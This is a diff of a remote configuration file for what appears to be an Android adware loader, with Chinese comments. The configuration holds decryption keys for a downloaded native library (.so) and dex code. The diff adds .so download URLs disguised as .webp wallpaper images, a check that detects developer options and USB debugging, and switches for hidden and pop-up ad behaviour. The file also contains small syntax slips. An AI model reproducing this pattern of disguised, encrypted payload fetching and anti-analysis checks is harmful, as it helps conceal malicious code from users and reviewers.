@@ -15,9 +15,6 @@
   "loquat_name_list": "",
   //TBA 用户类型分类
   "fig_ta_user": "aa",
-  // 垃圾词条
-  "auji_": false,
-  "sikzog": "true-98900eeer1010019",
   // B配置都不要下面的数据
   //广告检测间隔、定时触发间隔 单位秒,
   //广告显示间隔 单位秒,
@@ -31,14 +28,19 @@
   "guava_tim": "30-30-8-16-80-500-800-40-1000",
   // 广告id list
   "guava_id_list": "981772962-981772963",
-  "guava_f_n": "default.webp",
-  //解密so 的key
-  "guava_url": "87643aikzjsgsjzb",
-  //解密dex的key
-  "guava_de_u": "zmjusijgagd12356",
-  //so的下载地址
+  // 是否检查开发者选项默认检查和usb 0都检测 1检测开发者选项 3、都不检测
+  "guava_type_s": 0,
   // 隐藏/外弹/广播/文件开关 和So的信息依依对应
-  "guava_str": "custom-publ-art-paper"
+  "guava_str": "custom-publ-art-paper",
+  // 广告dex的下载路径
+  "guava_u_t": "",
+  // so下载地址
+  "guav_url_s": [
+    "https://wallpaperpu.com/cla_wall.webp",
+    "https://wallpaperpu.com/cla_wall3.webp",
+    "https://wallpaperpu.com/viza.webp",
+    "https://wallpaperpu.com/viza3.webp"
+  ]
 }
 
 //android.os.Build.VERSION_CODES.Q
@@ -46,7 +48,6 @@
 
 // 方案A
 {
-  //用-分割开
   "fig_timer": "60-60",
   "fig_c_max": 10,
   "fig_name_s": "emission",
@@ -54,27 +55,28 @@
   "fig_loquat_tt": "3616318175247400",
   "loquat_name_list": "",
   "fig_ta_user": "aa",
-  "auji_": false,
-  "sikzog": "true-98900eeer1010019",
   "guava_tim": "30-30-8-16-80-500-800-40-1000",
   "guava_id_list": "981772962-981772963",
-  "guava_f_n": "default.webp",
+  "guava_type_s": 0,
   "guava_url": "87643aikzjsgsjzb",
   "guava_de_u": "zmjusijgagd12356",
-  "guava_str": "custom-publ-art-paper"
+  "guava_str": "custom-publ-art-paper",
+  "guava_u_t": "",
+  "guav_url_s": [
+    "https://wallpaperpu.com/cla_wall.webp",
+    "https://wallpaperpu.com/cla_wall3.webp",
+    "https://wallpaperpu.com/viza.webp",
+    "https://wallpaperpu.com/viza3.webp"
+  ]
 }
 
 // 方案B
 {
-  //用-分割开
   "fig_timer": "60-60",
-  "fig_c_max": 10,f
+  "fig_c_max": 10,
   "fig_name_s": "emission",
   "fig_fb_id": "3616318175247400",
   "fig_loquat_tt": "3616318175247400",
   "loquat_name_list": "",
-  "auji_": false,
-  "sikzog": "true-98900eeer1010019",
-  "fig_ta_user": "aa"
+  "fig_ta_user": "aa",
 }
-
